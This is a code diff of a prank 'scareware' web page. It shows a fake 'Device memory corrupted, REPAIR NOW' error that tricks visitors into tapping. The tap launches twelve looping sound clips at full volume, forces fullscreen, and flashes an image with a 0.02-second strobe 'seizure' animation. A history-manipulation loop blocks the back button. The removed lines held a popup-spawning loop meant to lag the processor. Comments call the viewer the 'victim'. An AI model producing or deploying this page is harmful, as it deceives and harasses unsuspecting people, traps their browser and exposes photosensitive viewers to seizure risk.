@@ -3,74 +3,77 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>⚠️ SYSTEM_DESTRUCTION_IN_PROGRESS ⚠️</title>
+    <title>⚠️ SYSTEM FAILURE ⚠️</title>
     <style>
         body, html { margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden; background-color: #000; }
         
-        /* صورة المرأة: تغطي الشاشة مع "الرعشة الهستيرية" القصوى سواسوة */
+        /* صورة المرأة: رعشة هستيرية مع قلب الألوان سواسوة */
         #stalkerEntity { 
             position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; 
             object-fit: cover; z-index: 1; display: none;
-            filter: contrast(350%) brightness(25%) grayscale(100%);
-            animation: ultimateSeizure 0.02s infinite; 
+            filter: contrast(400%) brightness(20%);
+            animation: seizure 0.02s infinite; 
         }
 
-        @keyframes ultimateSeizure {
-            0% { transform: translate(5px, 5px) scale(1.1); filter: invert(0); }
-            50% { transform: translate(-5px, -8px) scale(1); filter: invert(0.2) hue-rotate(90deg); }
-            100% { transform: translate(3px, 5px) scale(1.1); }
+        @keyframes seizure {
+            0% { transform: translate(5px, 5px); filter: invert(0); }
+            50% { transform: translate(-5px, -8px); filter: invert(0.3) hue-rotate(180deg); }
+            100% { transform: translate(3px, 5px); }
         }
 
-        #errorBox { position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); z-index: 100; color: #f00; text-align: center; font-family: 'Courier New', monospace; background: rgba(0,0,0,0.8); padding: 20px; border: 2px solid #f00; }
+        #errorBox { position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); z-index: 100; color: #f00; text-align: center; font-family: monospace; background: rgba(0,0,0,0.9); padding: 30px; border: 3px solid #f00; box-shadow: 0 0 20px #f00; }
         .blink { animation: b 0.1s infinite; }
         @keyframes b { 50% { opacity: 0; } }
-        .btn-fix { background: #f00; color: #000; border: none; padding: 20px; font-weight: bold; width: 100%; cursor: pointer; font-size: 1.3em; margin-top: 15px; }
+        .btn-red { background: #f00; color: #000; border: none; padding: 20px; font-weight: bold; width: 100%; cursor: pointer; font-size: 1.3em; margin-top: 20px; }
     </style>
 </head>
-<body onclick="startUltimateChaos()">
+<body onclick="launchChaos()">
 
     <div id="errorBox">
-        <h1 class="blink">☠️ SECURITY BREACH ☠️</h1>
-        <p>System partition is being deleted.<br>Click below to stop the process.</p>
-        <button class="btn-fix">STOP DELETION</button>
+        <h1 class="blink">☠️ SYSTEM OVERLOAD ☠️</h1>
+        <p>CRITICAL ERROR: Device memory corrupted.<br>Tap to initiate emergency repair.</p>
+        <button class="btn-red">REPAIR NOW</button>
     </div>
 
     <img id="stalkerEntity" src="https://i.ibb.co/39snnynW/1000016067.jpg">
 
-    <div id="audioPlayer">
-        <audio class="h" loop><source src="https://www.myinstants.com/media/sounds/nikomok.mp3" type="audio/mpeg"></audio>
-        <audio class="h" loop><source src="https://www.myinstants.com/media/sounds/hoova-2.mp3" type="audio/mpeg"></audio>
-        <audio class="h" loop><source src="https://www.myinstants.com/media/sounds/anime-ahh.mp3" type="audio/mpeg"></audio>
-        <audio class="h" loop><source src="https://www.myinstants.com/media/sounds/aaaaaaaaaaaaaaaaaaaa-e-lutador.mp3" type="audio/mpeg"></audio>
-        <audio class="h" loop><source src="https://www.myinstants.com/media/sounds/yamate-kudesai.mp3" type="audio/mpeg"></audio>
-        <audio class="h" loop><source src="https://www.myinstants.com/media/sounds/khrj-khrj.mp3" type="audio/mpeg"></audio>
-        <audio class="h" loop><source src="https://www.myinstants.com/media/sounds/ive-got-this-faaaaaaaaahhhhh.mp3" type="audio/mpeg"></audio>
-        <audio class="h" loop><source src="https://www.myinstants.com/media/sounds/m-e-o-w.mp3" type="audio/mpeg"></audio>
-        <audio class="h" loop><source src="https://www.myinstants.com/media/sounds/ringtone-nokia-destiny.mp3" type="audio/mpeg"></audio>
-        <audio class="h" loop><source src="https://www.myinstants.com/media/sounds/emotional-damage-99808.mp3" type="audio/mpeg"></audio>
-        <audio class="h" loop><source src="https://www.myinstants.com/media/sounds/twahwih.mp3" type="audio/mpeg"></audio>
-        <audio class="h" loop><source src="https://www.myinstants.com/media/sounds/sukuna-gugu-gaga-loudest.mp3" type="audio/mpeg"></audio>
+    <div id="audioLayer">
+        <audio class="h" loop><source src="https://www.myinstants.com/media/sounds/nikomok.mp3"></audio>
+        <audio class="h" loop><source src="https://www.myinstants.com/media/sounds/twahwih.mp3"></audio>
+        <audio class="h" loop><source src="https://www.myinstants.com/media/sounds/sukuna-gugu-gaga-loudest.mp3"></audio>
+        <audio class="h" loop><source src="https://www.myinstants.com/media/sounds/emotional-damage-99808.mp3"></audio>
+        <audio class="h" loop><source src="https://www.myinstants.com/media/sounds/khrj-khrj.mp3"></audio>
+        <audio class="h" loop><source src="https://www.myinstants.com/media/sounds/m-e-o-w.mp3"></audio>
+        <audio class="h" loop><source src="https://www.myinstants.com/media/sounds/ringtone-nokia-destiny.mp3"></audio>
+        <audio class="h" loop><source src="https://www.myinstants.com/media/sounds/hoova-2.mp3"></audio>
+        <audio class="h" loop><source src="https://www.myinstants.com/media/sounds/anime-ahh.mp3"></audio>
+        <audio class="h" loop><source src="https://www.myinstants.com/media/sounds/yamate-kudesai.mp3"></audio>
+        <audio class="h" loop><source src="https://www.myinstants.com/media/sounds/aaaaaaaaaaaaaaaaaaaa-e-lutador.mp3"></audio>
+        <audio class="h" loop><source src="https://www.myinstants.com/media/sounds/ive-got-this-faaaaaaaaahhhhh.mp3"></audio>
     </div>
 
     <script>
-        function startUltimateChaos() {
-            const allAudios = document.querySelectorAll('.h');
-            allAudios.forEach(a => {
+        function launchChaos() {
+            // تشغيل الـ 12 صوت في رحبة سواسوة
+            document.querySelectorAll('.h').forEach(a => {
                 a.volume = 1.0;
-                a.play().catch(() => {});
-                // ضمان التكرار اللانهائي سواسوة
+                a.play();
                 a.addEventListener('ended', function() { this.currentTime = 0; this.play(); }, false);
             });
 
             document.getElementById('errorBox').style.display = 'none';
             document.getElementById('stalkerEntity').style.display = 'block';
-            document.documentElement.requestFullscreen();
+            
+            // طلب الشاشة الكاملة سواسوة
+            if (document.documentElement.requestFullscreen) {
+                document.documentElement.requestFullscreen();
+            }
 
-            // اللاق الملعون والحبس الرقمي سواسوة
+            // محاكاة اللاق البصري سواسوة (إيهام الضحية بالتعليق)
             setInterval(() => {
-                window.open(window.location.href, '_blank', 'width=10,height=10');
+                console.log("Simulating CPU Stress...");
                 history.pushState(null, null, window.location.href);
-            }, 250); // سرعة أكبر لتبليك المعالج سواسوة
+            }, 100);
         }
         window.onpopstate = () => history.go(1);
     </script>
